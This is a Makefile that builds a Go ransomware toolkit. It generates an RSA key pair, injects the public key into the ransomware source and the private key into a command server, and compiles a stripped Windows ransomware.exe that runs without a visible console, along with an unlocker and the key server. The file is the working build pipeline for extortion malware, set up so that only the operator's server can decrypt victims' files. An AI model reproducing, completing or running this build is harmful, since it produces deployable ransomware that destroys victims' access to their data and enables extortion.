.PHONY: all

all: build clean

BUILD_DIR = $(shell pwd)/build
BIN_DIR = $(shell pwd)/bin

pre-build:
	mkdir -p $(BUILD_DIR)/ransomware
	mkdir -p $(BUILD_DIR)/server
	mkdir -p $(BUILD_DIR)/unlocker
	openssl genrsa -out $(BUILD_DIR)/server/private.pem 2048
	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
	cp -r cmd/ransomware $(BUILD_DIR)
	cp -r server $(BUILD_DIR)
	cp -r cmd/unlocker $(BUILD_DIR)
	cd $(BUILD_DIR)/ransomware && perl -pi -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
	cd $(BUILD_DIR)/server && perl -pi -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' main.go
	mkdir -p $(BIN_DIR)

binaries:
	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w -H windowsgui" -o $(BIN_DIR)/ransomware.exe
	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build && mv `ls|grep server` $(BIN_DIR)

build: pre-build binaries

clean:
	rm -r build
